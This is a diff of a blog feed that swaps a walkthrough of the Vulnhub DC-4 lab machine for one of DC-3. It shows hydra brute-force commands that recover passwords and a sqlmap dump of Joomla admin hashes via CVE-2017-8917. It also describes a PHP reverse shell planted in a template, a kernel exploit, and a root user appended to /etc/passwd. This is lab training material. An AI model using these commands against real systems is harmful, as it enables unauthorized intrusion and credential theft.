-<p>There is also nothing except the login form. I tried SQL injection, but it did not work. Default passwords did not work, and username enumeration was not successful. So, I tried a brute-force attack with the default admin username, given that it’s a vulnerable box. If it were a real application, I don’t think this would have worked so far. We may need to create a different username and password list to run a more effective brute-force attack.</p>
+<p>There isn’t much available. Since it’s a Joomla application, I’d like to run another nmap for vulnerability scanning.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.197.136 http-post-form <span class="s1">'/login.php:username=^USER^&amp;password=^PASS^:S=command'</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">--script</span> vuln 10.10.10.6
 
-<span class="o">[</span>DATA] attacking http-post-form://192.168.197.136:80/login.php:username<span class="o">=</span>^USER^&amp;password<span class="o">=</span>^PASS^:S<span class="o">=</span><span class="nb">command</span>
-<span class="o">[</span>80][http-post-form] host: 192.168.197.136   login: admin   password: happy
-1 of 1 target successfully completed, 1 valid password found
+PORT   STATE SERVICE VERSION
+80/tcp open  http
+|_http-dombased-xss: Couldn<span class="s1">'t find any DOM based XSS.
+|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+| http-csrf: 
+| Spidering limited to: <span class="nv">maxdepth</span><span class="o">=</span>3<span class="p">;</span> <span class="nv">maxpagecount</span><span class="o">=</span>20<span class="p">;</span> <span class="nv">withinhost</span><span class="o">=</span>10.10.10.6
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.6:80/
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>reset&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: user-registration
+|     Form action: /index.php/component/users/?task<span class="o">=</span>reset.request&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>reset&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>remind&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: user-registration
+|     Form action: /index.php/component/users/?task<span class="o">=</span>remind.remind&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>remind&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/2-uncategorised/1-welcome
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?Itemid<span class="o">=</span>101
+|     Form <span class="nb">id</span>: username-lbl
+|     Form action: /index.php/component/users/?task<span class="o">=</span>user.login&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?Itemid<span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|_    Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+| http-vuln-cve2017-8917: 
+|   VULNERABLE:
+|   Joomla! 3.7.0 <span class="s1">'com_fields'</span> SQL Injection Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-8917
+|     Risk <span class="nb">factor</span>: High  CVSSv3: 9.8 <span class="o">(</span>CRITICAL<span class="o">)</span> <span class="o">(</span>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<span class="o">)</span>
+|       An SQL injection vulnerability <span class="k">in </span>Joomla! 3.7.x before 3.7.1 allows attackers
+|       to execute aribitrary SQL commands via unspecified vectors.
+|       
+|     Disclosure <span class="nb">date</span>: 2017-05-17
+|     Extra information:
+|       User: root@localhost
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-8917
+|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server<span class="s1">'s resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+| http-enum: 
+|   /administrator/: Possible admin folder
+|   /administrator/index.php: Possible admin folder
+|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
+|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
+|   /htaccess.txt: Joomla!
+|   /README.txt: Interesting, a readme.
+|   /bin/: Potentially interesting folder
+|   /cache/: Potentially interesting folder
+|   /images/: Potentially interesting folder
+|   /includes/: Potentially interesting folder
+|   /libraries/: Potentially interesting folder
+|   /modules/: Potentially interesting folder
+|   /templates/: Potentially interesting folder
+|_  /tmp/: Potentially interesting folder
+</span></code></pre></div></div>
+
+<p>From the second Nmap output, we found the version of Joomla, and it’s vulnerable to SQL injection. Let’s search in searchsploit to see if there is any exploit available for this Joomla version.</p>
+
+<p><img src="/assets/images/dc-3/1.png" alt="" /></p>
+
+<p>Searchsploit also reveals that this Joomla version is vulnerable to SQL injection. Let’s fire up SQLmap to automate the SQLi exploitation process.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.6/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=update.xml"</span><span class="nt">-p</span> list[fullordering] <span class="nt">-D</span> joomladb <span class="nt">-T</span> <span class="s1">'#__users'</span> <span class="nt">-C</span> <span class="nb">id</span>,username,password <span class="nt">--dump</span><span class="k">**</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 02:20:00 /2021-05-29/
+
+<span class="o">[</span>02:20:01] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span> 
+<span class="o">[</span>02:20:01] <span class="o">[</span>INFO] testing connection to the target URL
+<span class="o">[</span>02:20:01] <span class="o">[</span>WARNING] the web server responded with an HTTP error code <span class="o">(</span>500<span class="o">)</span> which could interfere with the results of the tests
+you have not declared cookie<span class="o">(</span>s<span class="o">)</span>, <span class="k">while </span>server wants to <span class="nb">set </span>its own <span class="o">(</span><span class="s1">'460ada11b31d3c5e5ca6e58fd5d3de27=c58fg7qsgap...985gcqei64'</span><span class="o">)</span><span class="nb">.</span> Do you want to use those <span class="o">[</span>Y/n] y
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>
+Parameter: list[fullordering] <span class="o">(</span>GET<span class="o">)</span>
+    Type: error-based
+    Title: MySQL <span class="o">&gt;=</span> 5.1 error-based - Parameter replace <span class="o">(</span>UPDATEXML<span class="o">)</span>
+    Payload: <span class="nv">option</span><span class="o">=</span>com_fields&amp;view<span class="o">=</span>fields&amp;layout<span class="o">=</span>modal&amp;list[fullordering]<span class="o">=(</span>UPDATEXML<span class="o">(</span>5655,CONCAT<span class="o">(</span>0x2e,0x7171716a71,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">5655</span><span class="o">=</span>5655,1<span class="o">)))</span>,0x71627a7a71<span class="o">)</span>,1990<span class="o">))</span>
+
+    Type: time-based blind
+    Title: MySQL <span class="o">&gt;=</span> 5.0.12 time-based blind - Parameter replace <span class="o">(</span>substraction<span class="o">)</span>
+    Payload: <span class="nv">option</span><span class="o">=</span>com_fields&amp;view<span class="o">=</span>fields&amp;layout<span class="o">=</span>modal&amp;list[fullordering]<span class="o">=(</span>SELECT 5736 FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>epcn<span class="o">)</span>
+<span class="nt">---</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL <span class="o">&gt;=</span> 5.1
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] fetching entries of column<span class="o">(</span>s<span class="o">)</span> <span class="s1">'`id`, `password`, username'</span> <span class="k">for </span>table <span class="s1">'#__users'</span> <span class="k">in </span>database <span class="s1">'joomladb'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'629'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'admin'</span>
+Database: joomladb
+Table: <span class="c">#__users</span>
+<span class="o">[</span>1 entry]
++------+--------------------------------------------------------------+----------+
+| <span class="nb">id</span>   | password                                                     | username |
++------+--------------------------------------------------------------+----------+
+| 629  | <span class="k">**</span><span class="nv">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><span class="k">**</span> | admin    |
++------+--------------------------------------------------------------+----------+
 </code></pre></div></div>
 
-<p>I’m lucky enough for now, i got the password for the admin user.</p>
+<p>Exploiting that SQL injection vulnerability with the help of SQLmap, we have successfully managed to obtain the admin user’s password hash. Now, we can use any hash-cracking tools, but for now, I will utilize the John the Ripper tool.</p>
 
-<p><img src="/assets/images/dc-4/2.png" alt="" /></p>
+<p><img src="/assets/images/dc-3/2.png" alt="" /></p>
 
-<p>There is nothing only command and logout option. So, i go for command.</p>
+<p>With the help of John, we successfully decrypted the hash and logged into the web application. I discovered two templates inside the template link.</p>
 
-<p><img src="/assets/images/dc-4/3.png" alt="" /></p>
+<p><img src="/assets/images/dc-3/3.png" alt="" /></p>
 
-<p>There is some functionality to run system commands. I plan to intercept the request and try to modify the default command they send. If I can manage to send my own commands, I will find the command injection vulnerability.</p>
+<p>After some exploration of the application’s admin dashboard, I found that the Beez3 template allows us to execute PHP code.</p>
 
-<p><img src="/assets/images/dc-4/4.png" alt="" /></p>
+<p><img src="/assets/images/dc-3/4.png" alt="" /></p>
 
-<p>They just send plain text commands here, and the server also accepts the modified commands. The command injection vulnerability is confirmed, and we can send a reverse shell command through this vulnerable parameter to get a reverse shell.</p>
+<p>I edited the Beez3 template, specifically the index.php file, and added some reverse shell code.</p>
+
+<p><img src="/assets/images/dc-3/5.png" alt="" /></p>
+
+<p>After saving the file we can just click on Template Preview button to execute the code.</p>
+
+<p><strong>Creds</strong></p>
+
+<aside>
+💡 admin:snoopy
+
+</aside>
 
 <h1 id="initial-foothold">Initial Foothold</h1>
 
-<p><img src="/assets/images/dc-4/5.png" alt="" /></p>
+<p><img src="/assets/images/dc-3/6.png" alt="" /></p>
 
-<p>Earlier, I verified the command injection. Then I attempted a bash TCP one-line reverse shell, but it didn’t work for me. After searching for different ways to get a shell, I found that netcat is present inside the box. Now, it’s a piece of cake to get the initial foothold.</p>
+<p>After adding our reverse shell code to the index.php file, before executing the code, I started a netcat listener to catch the reverse shell. The reverse shell code worked fine, and we obtained the initial foothold.</p>
 
-<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
 
-<p><img src="/assets/images/dc-4/6.png" alt="" /></p>
+<p>After obtaining the shell, I explored the file system for any misconfigurations, extra privilege files, or user permissions. However, I did not find anything interesting. Then, I decided to try kernel exploits. Using ‘lsb_release -a,’ I discovered that this is a very old Ubuntu machine.</p>
 
-<p>After getting the shell as www-data, I searched for the real users on this machine and found 4 users, including root. So, I started looking for files inside the users’ directories.</p>
+<p><img src="/assets/images/dc-3/7.png" alt="" /></p>
 
-<p><img src="/assets/images/dc-4/7.png" alt="" /></p>
+<p>Searchsploit already have some kernel exploit available.</p>
 
-<p>All the users’ home directories were empty except for Jim’s. There is a directory called ‘backup’ and two files, ‘mbox,’ which is not readable as www-data. The ‘<a href="http://test.sh/">test.sh</a>’ file has full access, and it is an SUID file. I can abuse this file since I have write access to it. However, I saw a password file, and I have three valid users, so it’s better to run an SSH brute force attack now.</p>
+<p><img src="/assets/images/dc-3/8.png" alt="" /></p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> old_password.bak 192.168.197.136 ssh
+<p>I just transfer the exploit into the victim machine and extract the zip file and run the exploit which gives me the root shell.</p>
 
-<span class="o">[</span>STATUS] 120.33 tries/min, 361 tries <span class="k">in </span>00:03h, 397 to <span class="k">do in </span>00:04h, 14 active
-<span class="o">[</span>22][ssh] host: 192.168.197.136   login: jim   password: jibril04
-</code></pre></div></div>
-
-<p>SSH brute force successfully manage jim password. so now we can login through ssh as jim.</p>
-
-<p><img src="/assets/images/dc-4/8.png" alt="" /></p>
-
-<p>Now i’m jim through SSH.</p>
-
-<p><img src="/assets/images/dc-4/9.png" alt="" /></p>
-
-<p>Now I can read the ‘mbox’ file; it’s an email. Let’s visit the mail folder for more information. Here is an email from Charles regarding his password. So, now I have Charles’ password as well.</p>
-
-<p><img src="/assets/images/dc-4/10.png" alt="" /></p>
-
-<p>I can normally change the user as chales and i done it here.</p>
-
-<p><img src="/assets/images/dc-4/11.png" alt="" /></p>
-
-<p>Before doing anything, I want to check Charles’ sudo permissions here. I found he has sudo access with no password in the Teehee editor. So, as we have sudo access with a file editor, we can modify any file we want. The very easy way to get root is to add a user with UID and GID 0.</p>
-
-<p><img src="/assets/images/dc-4/12.png" alt="" /></p>
-
-<p>Here i add raaj user with UID and GI 0 means its root user.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"raaj::0:0:::/bin/bash"</span> | <span class="nb">sudo </span>teehee <span class="nt">-a</span> /etc/passwd
-</code></pre></div></div>
-
-<p><img src="/assets/images/dc-4/13.png" alt="" /></p>
-
-<p>Now, just change the user to <code class="language-plaintext highlighter-rouge">raaj</code> and we are root because we set the UID and GID for the <code class="language-plaintext highlighter-rouge">raaj</code> user as 0. In the Linux file system, the UID and GID 0 are always reserved for the root.</p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[This box was so easy. There are only two ports open: SSH and the HTTP server. For the initial foothold, we need to attempt a brute force attack on the login form of the web application. After logging into the application, we can intercept the request and modify the commands. The lack of input validation will give us the command injection vulnerability, allowing us to gain the initial foothold into the box. The privilege escalation is also straightforward. We found a stored password list, and there was a valid password for one user, which allowed SSH login. Checking the mail revealed another user’s password who has some super permissions on a file editor. Using these super permissions, we can edit any file, leading to root access.]]></summary></entry></feed>
+<p><img src="/assets/images/dc-3/9.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the DC-3 machine from Vulnhub.]]></summary></entry></feed>
